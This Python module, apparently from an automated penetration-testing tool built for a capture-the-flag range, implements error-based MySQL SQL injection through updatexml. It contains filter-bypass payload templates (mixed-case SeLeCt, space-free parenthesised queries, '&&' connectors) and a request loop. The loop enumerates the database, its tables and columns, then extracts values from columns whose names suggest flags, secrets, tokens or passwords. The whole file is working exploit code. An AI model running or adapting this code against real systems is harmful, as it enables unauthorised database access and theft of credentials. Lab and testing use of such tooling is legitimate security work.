# -*- coding: utf-8 -*-
"""错误回显型提取（updatexml/extractvalue + 零分隔逻辑闭合）。

适用（2026-10-23 某靶场）：靶场过滤空格、`+`、`/**/`、注释符，UNION/SELECT 也过滤；
唯一可用形态是 `'and(updatexml(1,concat(0x7e,(expr),0x7e),1))and'1'='1`。

关键点：
- 靶场**分别**过滤小写 `select` 与大写 `SELECT`（两者都被删），混写成 `SeLeCt` 可存活；
- 空格被过滤 → 用**括号**分隔（SeLeCt(expr)from`tbl`where(cond)，零空白）；
- updatexml 报错内容约 32 字符上限 → substr 分片。
"""
from __future__ import annotations

import re

from app.services.prober import _build_request_keep

_ECHO_RE = re.compile(r"~([^~<>]{1,200})~")
_CHUNK = 30
_SEPARATORS = ("\n", "\t", " ")
_SELECT_RE = re.compile(r"\bselect\b", re.I)


def _mixed_case_select(text: str) -> str:
    """SELECT → SeLeCt：靶场同时过滤小写 `select` 和大写 `SELECT`（实测两者都被删），
    混写大小写能原样存活（2026-10-23 某靶场 实测）。"""
    return _SELECT_RE.sub("SeLeCt", text)


def rewrite_mysql_filters(expr: str, sep: str = "\n") -> str:
    """SELECT 改写为混写大小写，并把空格换成 sep（传统分隔符兜底路径）。"""
    out = _mixed_case_select(expr)
    return out.replace(" ", sep) if sep != " " else out


def build_echo_payload(prefix: str, expr: str, connector: str = "and") -> str:
    """零空格零注释的 updatexml 回显 payload；prefix 形如 `zhangsan'`。

    connector：逻辑连接符。过滤 `and` 的靶场要传 `&&`（2026-10-23 某靶场 实测）。
    """
    c = connector or "and"
    return f"{prefix}{c}(updatexml(1,concat(0x7e,({expr}),0x7e),1)){c}'1'='1"


# ---- 零空白表达式：SELECT(expr) / WHERE(cond) 用括号分隔；
#      FROM 后紧跟反引号标识符（词法上反引号开启新 token，等价于空白分隔）。
#      2026-10-23 某靶场 实测：空格/换行/制表都被吃掉，只有这种零空白形态能过。
_TABLES_ZERO = ("(SeLeCt(group_concat(table_name))"
                "from`information_schema`.`tables`where(table_schema=database()))")
_COLS_ZERO = ("(SeLeCt(group_concat(column_name))"
              "from`information_schema`.`columns`where(table_schema=database()"
              "and(table_name='{t}')))")
_VAL_ZERO = "(SeLeCt(group_concat(`{c}`))from`{t}`)"

# 传统空格形态（供不支持括号分隔的目标兜底）
_TABLES_SPACED = ("select group_concat(table_name) from information_schema.tables "
                  "where table_schema=database()")
_COLS_SPACED = ("select group_concat(column_name) from information_schema.columns "
                "where table_schema=database() and table_name='{t}'")
_VAL_SPACED = "select group_concat(`{c}`) from `{t}`"


def extract_echo(client, endpoint, param: str, prefix: str, expr: str,
                 *, sep: str = "\n", max_len: int = 96,
                 connector: str = "and") -> dict:
    """分片提取任意标量表达式（每片 ≤30 字符，updatexml 报错上限约 32）。"""
    out: list[str] = []
    requests = 0
    offset = 1
    while sum(len(x) for x in out) < max_len:
        sub = f"substr(({expr}),{offset},{_CHUNK})"
        payload = build_echo_payload(prefix, sub, connector)
        url, rp, rd = _build_request_keep(endpoint, param, payload)
        try:
            resp = client.request(endpoint.method, url, params=rp, data=rd,
                                  payload=payload)
        except Exception as exc:
            return {"value": "", "requests": requests, "error": str(exc)[:120]}
        requests += 1
        m = _ECHO_RE.search(resp.text or "")
        if not m:
            return {"value": "", "requests": requests,
                    "error": "no_echo" + ("（疑似空格/关键字仍被过滤）" if requests == 1 else "")}
        piece = m.group(1)
        out.append(piece)
        if len(piece) < _CHUNK:
            break
        offset += _CHUNK
    return {"value": "".join(out)[:max_len], "requests": requests, "error": None}


def pick_candidate(names: list[str], keywords: tuple[str, ...]) -> str | None:
    """从表/列清单里挑最像 flag/secret 的；没有则取最后一个（业务表常在后面）。"""
    if not names:
        return None
    for kw in keywords:
        for n in names:
            if kw in (n or "").lower():
                return n
    return names[-1]


_FLAG_KEYWORDS = ("flag", "secret", "key", "token", "pass", "answer")


def extract_schema_and_flag(client, endpoint, param: str, prefix: str,
                            *, sep: str = "\n", max_len: int = 192,
                            connector: str = "and") -> dict:
    """错误回显直取：库名 → 表 → 列 → 值。只读 SELECT，失败即返回已完成部分。"""
    res: dict = {"db": "", "table": "", "column": "", "tables": [], "columns": [],
                 "flag_sample": "", "requests": 0, "error": None}

    def _get(zero_expr: str, spaced_expr: str, ml: int = max_len) -> str:
        """先零空白（括号）形态，失败再试换行/制表/空格形态。"""
        for expr in (zero_expr,
                     rewrite_mysql_filters(spaced_expr, sep),
                     rewrite_mysql_filters(spaced_expr, "\t"),
                     rewrite_mysql_filters(spaced_expr, " ")):
            r = extract_echo(client, endpoint, param, prefix, expr, sep=sep,
                             max_len=ml, connector=connector)
            res["requests"] += int(r.get("requests") or 0)
            if r.get("value"):
                return r["value"]
            res["error"] = r.get("error") or "empty"
        return ""

    res["db"] = _get("database()", "database()", ml=64)
    if not res["db"]:
        return res
    tables_raw = _get(_TABLES_ZERO, _TABLES_SPACED)
    res["tables"] = [t.strip() for t in tables_raw.split(",") if t.strip()]
    table = pick_candidate(res["tables"], _FLAG_KEYWORDS)
    if not table:
        res["error"] = res["error"] or "no_tables"
        return res
    cols_raw = _get(_COLS_ZERO.format(t=table), _COLS_SPACED.format(t=table))
    res["columns"] = [c.strip() for c in cols_raw.split(",") if c.strip()]
    column = pick_candidate(res["columns"], _FLAG_KEYWORDS)
    if not column:
        res["error"] = res["error"] or "no_columns"
        return res
    res["table"], res["column"] = table, column
    res["flag_sample"] = _get(_VAL_ZERO.format(c=column, t=table),
                              _VAL_SPACED.format(c=column, t=table))
    return res
